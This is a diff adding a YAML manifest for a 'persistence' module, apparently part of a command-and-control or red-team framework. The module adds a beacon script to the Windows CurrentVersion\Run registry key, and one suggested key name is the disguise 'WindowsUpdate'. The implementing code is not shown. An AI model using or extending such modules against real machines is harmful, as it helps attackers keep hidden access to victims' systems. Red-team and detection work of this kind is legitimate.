@@ -1,0 +1,47 @@
+module:
+  id: add_script_to_registry
+  version: "1.0.0"
+  display_name: "Add Script to Registry"
+  description: "Add current script to Run registry key for persistence"
+
+  requires: []
+
+  provides:
+    - AddScriptToRegistry
+
+  files:
+    - code.ahk
+
+  dispatch:
+    AddScriptToRegistry: AddScriptToRegistry
+
+  schema:
+    category_id: persistence
+    category_name: "Persistence"
+    modules:
+      add_script_to_registry:
+        display_name: "Add Startup to Registry"
+        description: "Add the beacon script to the user's CurrentVersion\\Run registry"
+        command_template: "execute_module|AddScriptToRegistry|{key_name}"
+        parameters:
+          key_name:
+            type: text
+            display_name: "Key Name"
+            description: "This is just the name of the entry that will be created"
+            required: true
+            default: "StartUp"
+            validation:
+              min_length: 1
+              max_length: 64
+        documentation:
+          content: "Adds the beacon script to the user's CurrentVersion\\Run registry for persistence."
+          examples:
+            - "StartUp"
+            - "WindowsUpdate"
+        execution:
+          timeout: 30
+          requires_admin: false
+        ui:
+          layout: simple
+
+  config_options: {}
